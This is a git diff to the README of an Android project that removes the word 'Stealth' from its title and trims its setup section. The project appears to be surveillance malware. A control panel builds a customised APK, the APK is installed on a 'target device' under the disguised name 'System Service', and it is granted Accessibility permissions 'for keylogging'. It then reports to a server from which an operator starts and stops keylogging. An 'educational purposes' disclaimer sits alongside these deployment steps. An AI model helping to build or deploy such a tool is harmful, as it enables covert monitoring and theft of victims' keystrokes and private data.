@@ -1,4 +1,4 @@
-# Android Stealth Monitor
+# Android Monitor
 
 This project is a proof-of-concept Android application that demonstrates advanced system service capabilities, including background connectivity, accessibility features, and device monitoring. It includes a web-based control panel for managing connected devices. **This is for educational purposes only. Use responsibly and ensure compliance with all laws and ethical guidelines. Misuse can lead to legal consequences.**
 
@@ -51,23 +51,8 @@ The server uses **namespaces** to separate traffic between Android devices and t
 
 ## Setup
 
-### 1. Prepare Configuration File
 
-Create a `settings.json` file with your server details and host it (GitHub, web server, etc.):
-
-```json
-{
-  "server_url": "your-server-domain-or-ip:4000"
-}
-```
-
-- If protocol is omitted, defaults to `http://`.
-- If port is omitted, defaults: `80` for `http://`, `443` for `https://`.
-- Examples: `"example.com:8080"`, `"192.168.1.100"`, `"https://ws.boo.bar"`, `"https://example.com:4000"`
-
-**Example URL**: `https://raw.githubusercontent.com/user/repo/main/settings.json`
-
-### 2. Docker Setup
+### 1. Docker Setup
 This project uses Docker for the frontend (nginx + static files) and server (Socket.IO + Android APK generation). A `docker-compose.yml` file is included in the root directory for easy deployment.
 
 1. Clone the repository
@@ -85,16 +70,10 @@ This project uses Docker for the frontend (nginx + static files) and server (Soc
 2. The dashboard will list connected devices.
 
 ### 4. Generate and Deploy APK
-1. In the UI, enter your **Config URL** (e.g., `https://raw.githubusercontent.com/user/repo/main/settings.json`)
-2. Click "Build APK" – this triggers the server to compile a customized APK with the embedded config URL.
-3. Download the generated APK from the UI link (output in `./server/android-project/app/build/outputs/apk/`).
-4. Install on target device (enable "Install unknown apps" or use ADB: `adb install app-debug.apk`).
-5. Grant Accessibility permissions to the "System Service" app for keylogging.
-6. The app will:
-   - Fetch configuration from the provided URL on startup
-   - Parse host:port from the config
-   - Connect to the configured host:port
-   - Validate config when server sends `config_validation_request` event
+1. Click "Build APK" – this triggers the server to compile a customized APK with the embedded config URL.
+2. Download the generated APK from the UI link.
+3. Install on target device (enable "Install unknown apps" or use ADB: `adb install app-debug.apk`).
+4. Grant Accessibility permissions to the "System Service" app for keylogging.
 
 ### 5. Trigger Config Revalidation (Optional)
 Send a POST request to trigger all connected apps to revalidate their configuration:
@@ -104,11 +83,6 @@ curl -X POST http://localhost:4000/api/validate-config
 ```
 
 This is useful when you update your `settings.json` and want apps to pick up changes immediately.
-
-### 6. Testing and Monitoring
-- Android devices connect to the configured IP:port; monitor Docker logs: `docker compose logs` or `docker logs android-server`.
-- Use the UI to send "logger" commands (start/stop keylogging).
-- Device info (IP, model, etc.) updates in real-time via Socket.IO events.
 
 ## Configuration Update Workflow
 
